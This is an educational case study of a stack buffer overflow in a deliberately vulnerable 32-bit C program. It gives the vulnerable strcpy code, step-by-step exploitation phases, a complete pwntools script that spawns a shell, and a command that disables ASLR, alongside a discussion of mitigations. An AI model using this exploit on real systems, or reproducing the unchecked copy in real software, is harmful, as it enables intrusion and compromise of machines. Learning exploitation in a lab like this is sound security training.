# Case Study 2 — Finding and Exploiting a Buffer Overflow
> Writing a functional exploit script for a classic stack-based vulnerability.

## 1. Project Overview
This case study demonstrates the process of discovering and exploiting a classic stack-based buffer overflow vulnerability in a legacy 32-bit Linux C application. The objective is to understand how poor memory management can lead to arbitrary code execution. We target a vulnerable program that copies user input into a fixed-size buffer without bounds checking, allowing us to overwrite the return address on the stack. Ultimately, we craft a payload containing shellcode and execute it to spawn a root shell.

## 2. Architecture Diagrams

### Stack Memory Diagram (Before and After Overflow)

```text
[ Normal Execution Stack ]
+------------------------+  High Memory
| Command Line Args      |
+------------------------+
| Environment Variables  |
+------------------------+
| Return Address (EIP)   | <--- Instruction Pointer to return to after function
+------------------------+
| Saved Base Pointer(EBP)| 
+------------------------+
| Local Buffer (e.g., 64)| <--- strcpy() writes here, moving upwards
+------------------------+  Low Memory

[ Overflown Execution Stack ]
+------------------------+  High Memory
| Command Line Args      |
+------------------------+
| Shellcode (NOP sled +) |
+------------------------+
| Overwritten EIP        | <--- Points back into the NOP sled / Shellcode
+------------------------+
| Overwritten EBP        | <--- "AAAA..."
+------------------------+
| Local Buffer (Filled)  | <--- "AAAA..."
+------------------------+  Low Memory
```

## 3. Tech Stack Table

| Component | Technology | Purpose |
| --- | --- | --- |
| **Vulnerable App** | C | Legacy 32-bit executable compiled without protections |
| **Debugger** | GDB with PEDA / GEF | Dynamic analysis, stack inspection, and payload generation |
| **Exploit Framework**| Python 3 (pwntools) | Scripting the exploit, generating payloads, interacting with the binary |
| **Environment** | Linux (Ubuntu 32-bit VM) | Host OS for executing and debugging the vulnerable binary |

## 4. Step-by-Step Build

### Phase 1: Vulnerability Discovery and Fuzzing
- Send increasingly large inputs to the target application.
- Observe a segmentation fault when the input exceeds the buffer size.
- Use `dmesg` or GDB to confirm the instruction pointer (EIP) was overwritten (e.g., `EIP 0x41414141`).

### Phase 2: Controlling the Instruction Pointer (EIP)
- Generate a cyclic pattern using PEDA (`pattern create 200`) or pwntools (`cyclic 200`).
- Inject the pattern and find the exact offset where EIP is overwritten.
- Verify control by sending `[Offset * 'A'] + ['B' * 4] + ['C' * ...]`. EIP should be `0x42424242`.

### Phase 3: Finding Bad Characters
- Generate an array of all possible hex bytes `\x00` to `\xff`.
- Inject the badchar array after the EIP overwrite.
- Examine the stack in GDB. Identify bytes that are truncated, altered, or missing (e.g., `\x00` null byte, `\x0a` newline).
- Remove bad characters from future payload generation.

### Phase 4: Finding a Return Address
- Locate an instruction in the binary or its loaded libraries (like `libc`) that reliably jumps to our payload.
- In classic exploits with an executable stack, this is often a `JMP ESP` or `CALL ESP` instruction.

### Phase 5: Generating Shellcode
- Use `msfvenom` or pwntools to generate shellcode that avoids the identified bad characters.
- Example: Linux x86 `execve("/bin/sh")` shellcode.

### Phase 6: Writing the Exploit Script
- Assemble the final payload: `[Junk to reach EIP] + [Address of JMP ESP] + [NOP Sled] + [Shellcode]`.
- Automate the execution using a Python script.

## 5. Code Snippets

### The Vulnerable C Function
```c
#include <stdio.h>
#include <string.h>

// Vulnerable function
void copy_input(char *user_input) {
    char buffer[64];
    // strcpy does not check bounds!
    strcpy(buffer, user_input); 
    printf("Input copied successfully.\n");
}

int main(int argc, char **argv) {
    if (argc < 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return 1;
    }
    copy_input(argv[1]);
    return 0;
}
```

### The Exploit Generation Script (Python with pwntools)
```python
#!/usr/bin/env python3
from pwn import *

# 1. Setup
context.update(arch='i386', os='linux')
binary_path = './vulnerable_app'

# 2. Exploit Variables
offset = 76 # Found via cyclic pattern
jmp_esp = p32(0x080491a2) # Example address of 'jmp esp' found in binary
nop_sled = b"\x90" * 32

# 3. Shellcode (execve /bin/sh, avoiding \x00)
shellcode = asm(shellcraft.i386.linux.sh())

# 4. Build Payload
# Payload = [Junk] + [New EIP] + [NOPs] + [Shellcode]
payload = b"A" * offset
payload += jmp_esp
payload += nop_sled
payload += shellcode

print(f"[+] Payload length: {len(payload)} bytes")

# 5. Execute
p = process([binary_path, payload])
p.interactive()
```

## 6. Mitigation Context
This exploit works under the assumption of a disabled modern security posture. In a modern environment, the following mitigations would block this attack:

*   **ASLR (Address Space Layout Randomization):** Randomizes the location of the stack, heap, and libraries in memory. This makes hardcoding the return address (like `JMP ESP`) impossible. For this exercise, ASLR was temporarily disabled using `echo 0 > /proc/sys/kernel/randomize_va_space`.
*   **NX (No-eXecute) / DEP:** Marks the stack (and other data segments) as non-executable. Even if we land EIP in our shellcode, the CPU will throw an exception instead of executing it. The binary was compiled with `-z execstack` to disable this.
*   **Stack Canaries:** Places a random value between local variables and the return address. The function checks this value before returning. If the buffer overflows, the canary is modified, and the program aborts. The binary was compiled with `-fno-stack-protector` to bypass this.

## 7. Production Gotchas
*   **Off-by-One Errors:** Miscalculating the offset by a single byte can completely break the exploit. Careful verification with cyclic patterns is mandatory.
*   **Bad Characters:** A common pitfall. If `\x00` (null terminator) or `\x0a` (newline) are in your shellcode or return address, functions like `strcpy` or `gets` will stop copying your payload prematurely.
*   **Environment Variable Shifts:** Stack addresses vary slightly when running inside GDB versus running directly in the terminal, due to differences in environment variables. Using a NOP sled helps absorb these minor shifts, but a `JMP ESP` trampoline is more reliable.
*   **Payload Size Limits:** Sometimes the buffer isn't large enough to hold the shellcode after the EIP overwrite. This requires advanced techniques like "egg hunting" or a first-stage payload.

## 8. Lessons Learned
*   **Never trust user input:** All input must be strictly validated and bounds-checked.
*   **Avoid unsafe functions:** Legacy C functions like `strcpy`, `gets`, and `sprintf` should be replaced with safer alternatives like `strncpy` or `snprintf`.
*   **Security mitigations are defense-in-depth:** While ASLR and NX make exploitation significantly harder, they are not silver bullets. They force attackers to use more complex techniques like Return-Oriented Programming (ROP). Understanding the fundamentals of buffer overflows is crucial for comprehending modern exploit chains.
